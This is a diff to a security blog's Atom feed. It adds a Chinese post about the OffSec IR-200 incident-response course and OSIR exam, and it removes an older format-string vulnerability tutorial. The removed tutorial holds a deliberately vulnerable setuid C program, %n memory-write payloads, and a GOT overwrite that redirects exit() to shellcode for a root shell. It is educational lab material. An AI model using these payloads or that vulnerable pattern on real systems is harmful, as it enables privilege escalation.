@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://kevien.github.io/"/>
-  <updated>2024-08-07T15:38:01.679Z</updated>
+  <updated>2025-04-06T09:04:41.689Z</updated>
   <id>http://kevien.github.io/</id>
   
   <author>
@@ -14,6 +14,64 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>OffSec蓝队课程IR-200及OSIR考证之旅</title>
+    <link href="http://kevien.github.io/2025/04/06/OffSec%E8%93%9D%E9%98%9F%E8%AF%BE%E7%A8%8BIR-200%E5%8F%8AOSIR%E8%80%83%E8%AF%81%E4%B9%8B%E6%97%85/"/>
+    <id>http://kevien.github.io/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/</id>
+    <published>2025-04-06T08:56:41.000Z</published>
+    <updated>2025-04-06T09:04:41.689Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-3.png" alt="alt text"></p>
+<ul>
+<li>近期参加了OffSec蓝队方向应急响应相关的学习课程IR-200，以及参加了OSIR认证并获取了证书，在整个过程中感觉还是学到了很多应急方面的知识技能，简单总结一下这次的OSIR学习和考证之旅供大家参考。</li>
+<li>因为这个认证课程是在24年10月份左右推出，不像网上一些其它课程参考资料和经验文章那么多，OSIR认证相关的文章网上基本上没有，国外目前有这个证书的人不多，国内估计更少，所以能获取的外界帮助几乎没有，又因为这次是第一次参加OffSec的学习和认证，必然是一场艰难的踏冰之旅。<h2 id="IR-200学习"><a href="#IR-200学习" class="headerlink" title="IR-200学习"></a>IR-200学习</h2></li>
+<li>购买课程之后可以获取官方教材在线查看或者离线下载到本地进行查看，一共372页，包含以下的章节。<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image.png" alt="alt text"></li>
+<li>在拿到官方学习教材之后查看了大纲之后按顺序进行了学习，其中有些英文等都不太懂，这个时候可以下载一些辅助工具(比如谷歌的沉浸式翻译插件)来进行翻译，大大提升了学习效率。前面几个章节主要是理论概念知识的学习。比如安全事件的管理流程(这个课程主要遵循的是NIST标准)<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-1.png" alt="alt text"><br>还比如应急响应沟通的重要性及一些规范<br><img src="/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-2.png" alt="alt text"></li>
+<li>在介绍这些理论概念的时候也会结合具体的实际案例让学习者更加清楚直观的去感受。其中第六章和第八章是考试的重点，学习到的工具有<strong>splunk、autospy、procmon、tcpview、volaitlity、pestudio、RSA NetWitness、IRIS、response kit</strong>等。其中有些之前接触过，有些没接触过学下来之后增加了自己对事件响应的了解以及一些新领域的学习。尤其是取证这块儿(离线成像、在线成像、远程成像、虚拟机成像)，国内对这块儿做的比较少。当然在第六、八章节中会有几个在线实验环境，需要使用vpn连接进行学习，国内直连有问题浪费了一些时间，但可以看出课程开发人员还是花费了心思。尤其是使用<strong>splunk做日志关联分析</strong>，国内大部分的应急响应都是基于单机、跨机器或者日志不完整，很多时候也没有这样的机会去实践，所以说我觉得这个才整个课程的一大亮点，并且随着未来各个中小公司普及使用SIEM，必然需要大量具备这样技能的人才。</li>
+</ul>
+<ul>
+<li><p>剩下就是遏制、根除、恢复和跟踪总结阶段的工作内容、事件管理、报告编写等内容，也能学到不少干货。其中比如在事件管理协同平台<strong>IRIS</strong>，这款工具是开源的，<a href="https://github.com/dfir-iris/iris-web" target="_blank" rel="noopener">IRIS地址</a>，国内中大型的公司可以考虑使用这个工具进行事件管理和协同。提升安全事件管理效率。</p>
+<h2 id="关于考试"><a href="#关于考试" class="headerlink" title="关于考试"></a>关于考试</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">考试主要要求</span><br><span class="line">1.远程考试,需要开启摄像头和屏幕共享</span><br><span class="line">2.考试时长8h，考试满分70 50分为通过 考试涉及到两个场景 场景1 四个问题 一个问题10分，场景2 两个问题 一个问题15分</span><br><span class="line">3.考试完成需要24小时内提交英文报告(有模版可以参考)</span><br><span class="line">4.考试基本开卷，可以查询本地资料或者使用谷歌搜索但不能使用AI类工具(如chatgpt、deepseek等)</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>目前官方只有一套challenge lab（相对较少），但其实对考试参考意义比较大，而且在第一次独立打完这个lab的时候发现自己花了好长时间，因为我目前的理解是教材是基础，想要通过考试只学习教材是不够的，还需要去分析更多的事件场景以及了解更多关于样本分析的案例及实践。</p>
+</li>
+<li>标准课程中lab的有效期(包括章节中涉及的lab)默认有效期是90天，而且一旦开始不能中途暂停，所以最好在3个月内完成考试，否则想要进行实操环境练习就需要进行lab的再次购买。个人感觉如果基础一般且日常工作中没怎么用过SIEM事件分析的学习者只是学习官方教材以及lab，很难一次性通过。</li>
+<li>此外考试还有30分值的<strong>样本提取和分析</strong>，考察点有windows和linux的日志、恶意软件的行为分析等，最后一个样本分析中略带ctf的味道(目前还未涉及到使用IDA进行分析，后面可能高级课程如IR-300会有)。</li>
+<li>整体来说如果以上实操比较少而且考试时间相对较短8小时，通过的难度还是有些大。</li>
+<li>在整个学习过程中如果有任何问题和建议大家可以去官方discord IR-200频道沟通交流(包括课程章节和lab部分)，里面会有助教进行答疑。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">具体考试过程和注意事项：</span><br><span class="line">考试过程：</span><br><span class="line">1.线上预约(目前这个考试的预约人数应该不多，一般提前两三天即可)选白天或者自己状态最好的时间段。</span><br><span class="line">2.考官提前15分钟上线检查环境，需要检查英文证件(护照)、开启摄像头、开启屏幕共享(安装浏览器插件).考试中自己的屏幕拓展一开始有问题,后面切换到firefox浏览器正常了,花费了四十多分钟的时间.</span><br><span class="line">3.考试 考试开始后阅读题目要求和注意事项-&gt;下载vpn配置文件并连接-&gt;根据题目要求找到关键线索并提交答案，当然在这个过程中需要边做边截图，否则后面时间可能不够用，因为考试一旦结束即不能进行环境的访问影响报告的编写。中途如果卡壳可以申请休息一下，在休息期间可以进行反思看是否有遗漏的地方往往会有很好的效果。准备休息和休息回来的时候跟监考老师打个招呼但不用等他回复。考试中间如果遇到有网络问题可以和监考老师及时反馈。</span><br><span class="line">4.考试结束 经过8h的奋战(刨除检查以及中途休息等因素大概6个小时)后需要24h内提交英文版报告，报告中涉及到完整的事件发现、线索追踪、事件遏制、事件根除等方面，而且需要提供完整的截图。</span><br><span class="line">5.报告提交后 一般10个工作日之内会有邮件通知通过与否(并不公布具体分数)，顺利的话一般1-2个工作日，卡及格线通过可能需要久些。</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="学习收获及证书作用及就业"><a href="#学习收获及证书作用及就业" class="headerlink" title="学习收获及证书作用及就业"></a>学习收获及证书作用及就业</h2><ul>
+<li><strong>首先通过系统性的学习能收获完整的网络安全应急响应方向知识，让自己具有更广阔的视野。</strong></li>
+<li><strong>应急实战能力的提升</strong></li>
+<li><strong>报告能力的提升</strong></li>
+<li><strong>英文能力的提升</strong></li>
+<li>证书作用及就业：目前国内外网络安全领域对蓝队相关工作岗位需求还是比较大，尤其是具有丰富实战经验的人员，如果能啃下这个证书，那么你可以应付国内大部分蓝队的工作，比如<strong>安全监控、事件研判分析、应急响应项目经理、安全运营工程师</strong>等，此外有了这个证书对于寻求一些外企工作岗位也很有帮助。<h2 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h2></li>
+<li><p>国内访问lab会有问题可以本机使用aws的vps或者在路由器上做代理(我一直用的后者比较丝滑),另外考试没有必须要求在kali虚拟机上连接vpn进行操作，我考试的时候就是用的mac openvpn进行连接，但要做好路由转发 如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo route -n add -net 192.168.195.132/24 -interface utun4</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>最好有拓展屏幕，而且是<strong>竖屏显示的拓展屏</strong>，因为日志分析的时候观看更方便舒适，截图更完整。</p>
+</li>
+<li><strong>寻找队友 组队考证交流+一起报名享优惠 微信 </strong>TXJfTTByaw==<strong>,要求有一定的红队或蓝队基础及经验。</strong><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li>
+<li><a href="https://manage.offsec.com/app/uploads/2024/10/IR-200_-Foundational-Incident-Response-Syllabus-final.pdf" target="_blank" rel="noopener">课程大纲</a></li>
+<li><a href="https://www.offsec.com/report-templates/OSIR-Exam-Report.docx" target="_blank" rel="noopener">报告模版</a></li>
+<li><a href="https://help.offsec.com/hc/en-us/articles/30960007786900-OSIR-Exam-Guide" target="_blank" rel="noopener">OSIR考试指南</a></li>
+<li><a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" rel="noopener">sysmon 常见事件id</a></li>
+<li><a href="https://github.com/Psmths/windows-forensic-artifacts" target="_blank" rel="noopener">windows取证证据</a></li>
+<li><a href="https://medium.com/@araman99/uncovering-windows-forensics-artefacts-for-digital-forensics-investigators-e0b75f01d086" target="_blank" rel="noopener">Uncovering Windows Forensics Artefacts for Digital Forensics Investigators</a></li>
+<li><a href="https://bots.splunk.com/" target="_blank" rel="noopener">splunk 靶场</a></li>
+</ul>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;TL；DR&quot;&gt;&lt;a href=&quot;#TL；DR&quot; class=&quot;headerlink&quot; title=&quot;TL；DR&quot;&gt;&lt;/a&gt;TL；DR&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2025/04/06/OffSec蓝队课程IR-200及OSIR考证之旅/image-3.pn
+    
+    </summary>
+    
+    
+  </entry>
   
   <entry>
     <title>Linux LKM Rootkit简介与排查</title>
@@ -625,7 +683,7 @@
     <link href="http://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/"/>
     <id>http://kevien.github.io/2019/02/16/linux常见backdoor及排查技术/</id>
     <published>2019-02-16T13:38:54.000Z</published>
-    <updated>2023-06-25T08:42:52.365Z</updated>
+    <updated>2024-12-06T10:13:46.119Z</updated>
     
     <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">原文已发布至先知平台</span><br><span class="line">linux常见backdoor及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4090</span><br><span class="line">windows常见backdoor、权限维持方法及排查技术</span><br><span class="line">https://xz.aliyun.com/t/4842</span><br></pre></td></tr></table></figure>
 <h2 id="TL；DR"><a href="#TL；DR" class="headerlink" title="TL；DR"></a>TL；DR</h2><p><img src="/2019/02/16/linux常见backdoor及排查技术/backdooropen.jpg" alt=""></p>
@@ -701,6 +759,7 @@
 </li>
 <li>缺点：易被检测到</li>
 <li>排查：使用netstat -antlp查看可疑端口，然后ls -l 可执行文件即可。<br><img src="/2019/02/16/linux常见backdoor及排查技术/lssshd.png" alt=""></li>
+<li><a href="https://mp.weixin.qq.com/s/clSHwC9ZNF_FXEF0ZDAawA" target="_blank" rel="noopener">参考链接-SSH软链接后门利用和原理</a></li>
 <li>另外一种就是通过在openssh源码中插入恶意代码重新编译并替换原有sshd文件。插入的恶意代码可以是将登录成功的用户密码发送到远程服务器或者记录到某个log文件中。</li>
 <li>优点：隐蔽性较好</li>
 <li>缺点：暂无</li>
@@ -895,83 +954,6 @@
     
     
       <category term="java安全 RCE" scheme="http://kevien.github.io/tags/java%E5%AE%89%E5%85%A8-RCE/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>格式化字符串漏洞</title>
-    <link href="http://kevien.github.io/2018/04/07/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
-    <id>http://kevien.github.io/2018/04/07/格式化字符串漏洞/</id>
-    <published>2018-04-06T21:37:24.000Z</published>
-    <updated>2018-08-24T04:26:49.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h4><ul>
-<li>不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这两天学习了一下，仅当笔记留以备忘。</li>
-<li>在了解格式化字符串漏洞之前还是应该先了解一下printf函数的基本功能。</li>
-<li>可以使用命令 man 3 printf 查看printf函数的功能介绍，其中printf是c语言中为数不多的支持可变参数的库函数。根据cdecl的函数调用规定，函数从最右边的参数开始，逐个压栈。如果要传入的是一个字符串，那么就将字符串的指针压栈。这一切都井井有条的进行着。如果是一般的函数，函数的调用者和被调用者都应该知道函数的参数个数以及每个参数的类型。但是对于像printf这种可变参数的函数来说，一切就变得模糊了起来。函数的调用者可以自由的指定函数参数的数量和类型，被调用者无法知道在函数调用之前到底有多少参数被压入栈帧当中。所以printf函数要求传入一个format参数用以指定到底有多少，怎么样的参数被传入其中。然后它就会忠实的按照函数调用者传入的格式一个一个的打印出数据。</li>
-<li>测试环境ubuntuX86<h4 id="任意内存读取"><a href="#任意内存读取" class="headerlink" title="任意内存读取"></a>任意内存读取</h4></li>
-<li><p>如下是函数printf format的参数、输入类型以及输出类型</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">| Parameter  |  Input Type | Output Type                    |</span><br><span class="line">| - - - - - -| - - - - - - | - - - - - - - - - - - - - - -  |</span><br><span class="line">| %d         | Value       | Decimal                        |</span><br><span class="line">| %u         | Value       | Unsigned decimal               |</span><br><span class="line">| %x         | Value       | Hexadecimal                    |</span><br><span class="line">| %s         | Pointer     | String                         |</span><br><span class="line">| %n         | Pointer     | Number of bytes written so far |</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>试想有这样一种情况，我们要求printf打印的数据数量大于我们所给的数量会怎样？printf函数不可能知道栈帧中哪一些数据是它传入的参数，哪些是属于函数调用者的数据。</p>
-</li>
-<li>vuln code<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#fmt_vuln.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[]) &#123;</span><br><span class="line">   char text[1024];</span><br><span class="line">   static int test_val = -72;</span><br><span class="line"></span><br><span class="line">   if(argc &lt; 2) &#123;</span><br><span class="line">      printf(&quot;Usage: %s &lt;text to print&gt;\n&quot;, argv[0]);</span><br><span class="line">      exit(0);</span><br><span class="line">   &#125;</span><br><span class="line">   strcpy(text, argv[1]);</span><br><span class="line"></span><br><span class="line">   printf(&quot;The right way to print user-controlled input:\n&quot;);</span><br><span class="line">   printf(&quot;%s&quot;, text);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   printf(&quot;\nThe wrong way to print user-controlled input:\n&quot;);</span><br><span class="line">   printf(text);</span><br><span class="line"></span><br><span class="line">   printf(&quot;\n&quot;);</span><br><span class="line"></span><br><span class="line">   // Debug output</span><br><span class="line">   printf(&quot;[*] test_val @ 0x%08x = %d 0x%08x\n&quot;, &amp;test_val, test_val, test_val);</span><br><span class="line"></span><br><span class="line">   exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">编译指令：</span><br><span class="line">gcc -g fmt_vuln.c -o fmt_vuln</span><br><span class="line">sudo chown root fmt_vuln</span><br><span class="line">sudo chmod u+s fmt_vuln</span><br></pre></td></tr></table></figure>
-<ul>
-<li>当我们输入 AAAA%08x.%08x.%08x.%08x可以看到我们读取到了保存于栈中的数据（输入的AAAA），当然如果输入的%08x更多还会读取到栈中更多的数据<br><img src="/2018/04/07/格式化字符串漏洞/memread.png" alt=""></li>
-<li>如果写入的AAAA是一个敏感的地址呢，比如指向敏感字符串的地址。<br><img src="/2018/04/07/格式化字符串漏洞/readspecifyadd.png" alt=""><h4 id="任意内存写入"><a href="#任意内存写入" class="headerlink" title="任意内存写入"></a>任意内存写入</h4></li>
-<li>任意内存写入需要用到%n这个不常用的参数，它的功能是将%n之前printf已经打印的字符个数赋值给传入的指针,通过%n我们就可以修改内存中的值了。还是原来的漏洞代码。</li>
-<li><p>此外还需要$的配合，如下的代码</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">printf(&quot;7th: %7$d, 4th: %4$05d\n&quot;, 10, 20, 30, 40, 50, 60, 70, 80);</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>会打印输出</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7th: 70, 4th: 00040</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>即%7$d 获取的将是参数列表中第7个元素的值，%4$05d 获取的是第四个参数的值，且有效位长度是5</p>
-</li>
-<li>使用short writes,一个四字节的值可以使用两个%hn去完成覆盖。</li>
-<li>例如下面的输入  $(printf “\x30\xa0\x04\x08\x32\xa0\x04\x08”)%43699x%4\$hn%8738x%5\$hn 会将test_val地址的值修改为0xccddaabb<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ gdb -q </span><br><span class="line">gdb-peda$ p/h 0xaabb - 8</span><br><span class="line">Size letters are meaningless in &quot;print&quot; command.</span><br><span class="line">gdb-peda$ p/d 0xaabb - 8</span><br><span class="line">$1 = 43699</span><br><span class="line">gdb-peda$ p/d 0xccdd - 0xaabb</span><br><span class="line">$2 = 8738</span><br><span class="line">gdb-peda$ quit</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  123</span><br><span class="line">The right way to print user-controlled input:</span><br><span class="line">123</span><br><span class="line">The wrong way to print user-controlled input:</span><br><span class="line">123</span><br><span class="line">[*] test_val @ 0x0804a030 = -72 0xffffffb8</span><br><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ ./fmt_vuln  $(printf &quot;\x30\xa0\x04\x08\x32\xa0\x04\x08&quot;)%43699x%4\$hn%8738x%5\$hn</span><br><span class="line">The right way to print user-controlled input:</span><br><span class="line">0�2�%43699x%4$hn%8738x%5$hn</span><br><span class="line">The wrong way to print user-controlled input:</span><br><span class="line">0�2� ...</span><br><span class="line">[*] test_val @ 0x0804a030 = -857888069 0xccddaabb</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<h4 id="覆盖GOT表"><a href="#覆盖GOT表" class="headerlink" title="覆盖GOT表"></a>覆盖GOT表</h4><ul>
-<li>可能会有人问能不能通过这种漏洞来getshell呢，答案是可以的，且方法不止一种，下面介绍一种相对来说简单且常用的方法，通过覆盖GOT表方法来getshell的trick，总体的思路就是程序最后要执行exit函数，我们覆盖exit函数的地址为shellcode的地址来达到getshell的目的。</li>
-<li>我们知道一个程序可以使用共享库，那么它必然有一个存放了各个函数对应的地址的表，这个表就是PLT(procedure linkage table)。</li>
-<li><p>使用objdump 查看plt section</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -d -j .plt ./fmt_vuln</span><br><span class="line"></span><br><span class="line">./fmt_vuln:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">08048360 &lt;printf@plt-0x10&gt;:</span><br><span class="line"> 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004</span><br><span class="line"> 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008</span><br><span class="line"> 804836c:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">08048370 &lt;printf@plt&gt;:</span><br><span class="line"> 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c</span><br><span class="line"> 8048376:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 804837b:	e9 e0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">08048380 &lt;strcpy@plt&gt;:</span><br><span class="line"> 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010</span><br><span class="line"> 8048386:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 804838b:	e9 d0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">08048390 &lt;puts@plt&gt;:</span><br><span class="line"> 8048390:	ff 25 14 a0 04 08    	jmp    *0x804a014</span><br><span class="line"> 8048396:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 804839b:	e9 c0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483a0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80483a0:	ff 25 18 a0 04 08    	jmp    *0x804a018</span><br><span class="line"> 80483a6:	68 18 00 00 00       	push   $0x18</span><br><span class="line"> 80483ab:	e9 b0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483b0 &lt;exit@plt&gt;:</span><br><span class="line"> 80483b0:	ff 25 1c a0 04 08    	jmp    *0x804a01c</span><br><span class="line"> 80483b6:	68 20 00 00 00       	push   $0x20</span><br><span class="line"> 80483bb:	e9 a0 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> 80483c0:	ff 25 20 a0 04 08    	jmp    *0x804a020</span><br><span class="line"> 80483c6:	68 28 00 00 00       	push   $0x28</span><br><span class="line"> 80483cb:	e9 90 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br><span class="line"></span><br><span class="line">080483d0 &lt;putchar@plt&gt;:</span><br><span class="line"> 80483d0:	ff 25 24 a0 04 08    	jmp    *0x804a024</span><br><span class="line"> 80483d6:	68 30 00 00 00       	push   $0x30</span><br><span class="line"> 80483db:	e9 80 ff ff ff       	jmp    8048360 &lt;_init+0x2c&gt;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>如上所示可以看到exit函数的相关跳转，但是这个plt section是READONLY即只读不可修改的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xxx@ubuntu:~/Desktop/pwntest/formatstringexp$ objdump -h ./fmt_vuln | grep -A1 &quot;\ .plt\ &quot;</span><br><span class="line"> 11 .plt          00000080  08048360  08048360  00000360  2**4</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>但如果仔细看的话，可以知道jmp    *0x804a01c 中的jmp地址并不是一个直接的地址，而是一个指针指向的地址，即exit函数的地址是存放在地址0x804a01c处的。</p>
-</li>
-<li>这些个地址是存在放另外的section的，叫做global offset table(GOT),它是可写的。然后通过objdump可以获取的到。<br><img src="/2018/04/07/格式化字符串漏洞/objgot.png" alt=""> </li>
-<li><p>如上说明exit函数是在0x0804a01c这个地址上的。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./fmt_vuln $(printf &quot;\x1e\xa0\x04\x08\x1c\xa0\x04\x08&quot;)%49143x%4\$hn%12981x%5\$hn</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>这次我们还是将shellcode放入到环境变量中，然后将exit函数的地址指向shellcode所存放的环境变量(这种一般是用在提权操作上,普通用户运行了setuid的程序)<br><img src="/2018/04/07/格式化字符串漏洞/shell1.png" alt=""><br><img src="/2018/04/07/格式化字符串漏洞/shell2.png" alt=""></p>
-</li>
-<li>如上，当程序调用exit函数的时候，通过PLT跳转并在GOT表中获取到了调用的地址,由于这个地址已经被修改为shellcode的入口地址，所以我们就获取到了root权限的shell。</li>
-<li>可以写任意地址其实就提供了很多种可能性，只要是可写的内存且包含了程序执行流的都可以是写入的目标。<h4 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h4></li>
-<li>这里就主要过程做了说明，想要真正理解还需要自己动手去实践。<br><a href="https://github.com/kevien/exploitcode/tree/master/formatstringexp" target="_blank" rel="noopener">github repo</a><h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4></li>
-<li>《Hacking the art of exploitation》0x352</li>
-<li>漏洞挖掘基础之格式化字符串<br><a href="http://drops.xmd5.com/static/drops/papers-9426.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/papers-9426.html</a></li>
-<li>格式化字符串漏洞简介<br><a href="http://drops.xmd5.com/static/drops/binary-7714.html" target="_blank" rel="noopener">http://drops.xmd5.com/static/drops/binary-7714.html</a></li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;TL-DR&quot;&gt;&lt;a href=&quot;#TL-DR&quot; class=&quot;headerlink&quot; title=&quot;TL;DR&quot;&gt;&lt;/a&gt;TL;DR&lt;/h4&gt;&lt;ul&gt;
-&lt;li&gt;不同于buffer overflow，格式化字符串漏洞是另外一种漏洞类型，ctf的pwn中经常会遇到，这
-    
-    </summary>
-    
-    
-      <category term="reverse" scheme="http://kevien.github.io/tags/reverse/"/>
-    
-      <category term="linux" scheme="http://kevien.github.io/tags/linux/"/>
     
   </entry>
   
